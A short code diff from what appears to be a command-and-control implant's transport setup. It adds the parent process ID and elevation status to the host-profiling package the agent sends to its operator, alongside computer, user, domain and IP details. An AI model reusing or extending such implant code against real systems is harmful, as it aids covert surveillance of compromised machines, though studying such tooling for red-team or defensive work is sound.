@@ -39,15 +39,15 @@ FUNC BOOL TransportInit()
     
 
     PackageAddInt32(   Package, Instance()->Session.AgentId       );
-    PackageAddString(  Package, Instance()->System.ComputerName );
-    PackageAddString(  Package, Instance()->System.UserName     );
-    PackageAddString(  Package, Instance()->System.DomainName   );
-    PackageAddString(  Package, Instance()->System.IpAddress    );
+    PackageAddString(  Package, Instance()->System.ComputerName   );
+    PackageAddString(  Package, Instance()->System.UserName       );
+    PackageAddString(  Package, Instance()->System.DomainName     );
+    PackageAddString(  Package, Instance()->System.IpAddress      );
     PackageAddWString( Package, Instance()->Session.ProcessName   );
-    PackageAddInt32( Package, Instance()->Session.ProcessId );
-    PackageAddInt32( Package, (DWORD) 0 );
-    PackageAddInt32( Package, Instance()->Session.ProcessArch );
-    PackageAddInt32( Package, FALSE ); // default
+    PackageAddInt32(   Package, Instance()->Session.ProcessId     );
+    PackageAddInt32(   Package, Instance()->Session.ParentProcId  );
+    PackageAddInt32(   Package, Instance()->Session.ProcessArch   );
+    PackageAddInt32(   Package, Instance()->Session.Elevated      ); 
 
     PackageAddInt32( Package, Instance()->System.OsMajorV );
     PackageAddInt32( Package, Instance()->System.OsMinorv );
